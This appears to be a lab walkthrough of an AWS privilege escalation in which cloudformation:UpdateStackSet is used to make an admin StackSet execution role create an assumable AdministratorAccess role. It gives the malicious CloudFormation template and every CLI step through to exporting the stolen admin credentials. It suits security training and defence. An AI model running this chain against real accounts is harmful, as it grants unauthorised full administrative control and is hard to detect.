# Guided Walkthrough: Privilege Escalation via cloudformation:UpdateStackSet

This scenario demonstrates a sophisticated privilege escalation vulnerability where a user with `cloudformation:UpdateStackSet` permission can modify an existing CloudFormation StackSet that has an administrative execution role. CloudFormation StackSets are designed for deploying resources across multiple AWS accounts and regions, and they rely on execution roles in target accounts to create and manage resources. When these execution roles have excessive permissions, an attacker can leverage them to escalate privileges.

The attack works by updating the StackSet's CloudFormation template to include new IAM resources — specifically an IAM role with administrative permissions that the attacker can assume. Because the StackSet's execution role performs the actual resource creation, the attacker effectively bypasses their own permission boundaries and leverages the StackSet's elevated privileges. The execution role creates the new admin role on behalf of the attacker, who can then assume it to gain full administrative access.

This vulnerability is particularly dangerous because StackSet execution roles often have broad permissions by design — they need to create various resources across multiple accounts and regions. Organizations frequently overlook this privilege escalation path because the `cloudformation:UpdateStackSet` permission appears innocuous, and the connection between StackSet updates and IAM privilege escalation is not immediately obvious. The attack leaves minimal forensic evidence beyond standard CloudFormation API calls, making it an attractive vector for persistent access.

## The Challenge

You start with access to `pl-prod-cloudformation-004-to-admin-starting-user`, an IAM user with `iam:PassRole` and `cloudformation:UpdateStackSet` permissions. Your goal is to reach full administrative access via `pl-prod-cloudformation-004-to-admin-escalated-role`.

The path is: update an existing StackSet with a malicious template → the StackSet's admin execution role creates a new IAM role → assume that role for admin access.

## Reconnaissance

First, confirm who you are and establish that you don't yet have admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-cloudformation-004-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied — as expected
```

Next, look at the existing StackSet. The helpful permissions let you inspect what's already deployed:

```bash
aws cloudformation describe-stack-set \
  --stack-set-name pl-prod-cloudformation-004-to-admin-stackset \
  --query 'StackSet.[StackSetName,Status,Description]' \
  --output table
```

Retrieve the current template to understand what's in it:

```bash
aws cloudformation describe-stack-set \
  --stack-set-name pl-prod-cloudformation-004-to-admin-stackset \
  --query 'StackSet.TemplateBody' \
  --output text
```

The current template is benign — it just creates an S3 bucket. But notice the StackSet is configured with an execution role (`pl-prod-cloudformation-004-to-admin-stackset-execution-role`) that holds AdministratorAccess. Anything you can get that execution role to create, you get for free.

## Exploitation

The key insight: `cloudformation:UpdateStackSet` lets you change what the StackSet deploys. The execution role will then apply those changes — with its AdministratorAccess. If you add an IAM role to the template with a trust policy pointing back at yourself, the execution role will create it.

### Step 1: Craft the malicious template

Build a CloudFormation template that includes the original S3 bucket resource (to avoid errors from removing existing resources) plus a new IAM role:

```json
{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Resources": {
    "BenignBucket": {
      "Type": "AWS::S3::Bucket",
      "Properties": {
        "BucketName": "pl-prod-cloudformation-004-benign-<account_id>-<suffix>"
      }
    },
    "EscalatedAdminRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "RoleName": "pl-prod-cloudformation-004-to-admin-escalated-role",
        "AssumeRolePolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [{
            "Effect": "Allow",
            "Principal": {
              "AWS": "arn:aws:iam::<account_id>:user/pl-prod-cloudformation-004-to-admin-starting-user"
            },
            "Action": "sts:AssumeRole"
          }]
        },
        "ManagedPolicyArns": ["arn:aws:iam::aws:policy/AdministratorAccess"]
      }
    }
  }
}
```

Save that to `/tmp/malicious-stackset-template.json`.

### Step 2: Update the StackSet

Call `cloudformation:UpdateStackSet`, specifying the administration role ARN (which you can `iam:PassRole` to) and the execution role name:

```bash
aws cloudformation update-stack-set \
  --stack-set-name pl-prod-cloudformation-004-to-admin-stackset \
  --template-body file:///tmp/malicious-stackset-template.json \
  --administration-role-arn arn:aws:iam::<account_id>:role/pl-prod-cloudformation-004-to-admin-stackset-admin-role \
  --execution-role-name pl-prod-cloudformation-004-to-admin-stackset-execution-role \
  --capabilities CAPABILITY_NAMED_IAM \
  --query 'OperationId' \
  --output text
```

This returns an operation ID. The StackSet's admin role orchestrates the update, and the execution role in the target account (this account) carries out the actual resource creation — including creating your new IAM role.

### Step 3: Wait for the operation to complete

Poll until the status reaches `SUCCEEDED`:

```bash
aws cloudformation describe-stack-set-operation \
  --stack-set-name pl-prod-cloudformation-004-to-admin-stackset \
  --operation-id <operation-id> \
  --query 'StackSetOperation.Status' \
  --output text
```

Once it shows `SUCCEEDED`, wait an additional 15 seconds for IAM propagation.

### Step 4: Assume the escalated role

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::<account_id>:role/pl-prod-cloudformation-004-to-admin-escalated-role \
  --role-session-name escalated-session \
  --query 'Credentials' \
  --output json
```

Export the returned credentials:

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>
```

## Verification

Confirm the escalation worked:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::<account_id>:assumed-role/pl-prod-cloudformation-004-to-admin-escalated-role/escalated-session

aws iam list-users --max-items 3 --output table
# Returns a list of IAM users — admin access confirmed
```

## What Happened

You exploited the gap between the permissions you hold (`cloudformation:UpdateStackSet`) and the permissions the StackSet's execution role holds (AdministratorAccess). By modifying the StackSet template to define a new IAM role with a trust policy pointing back to you, you instructed the execution role to create that role on your behalf — a classic confused-deputy escalation pattern.

In real environments this path appears frequently because StackSet execution roles are often provisioned with broad permissions ("it needs to deploy anything") while the UpdateStackSet permission is granted to developers or automation accounts that seem untrusted. The CloudFormation API calls look entirely routine in CloudTrail, making detection difficult without purpose-built analytics that correlate template diffs with IAM resource creation.
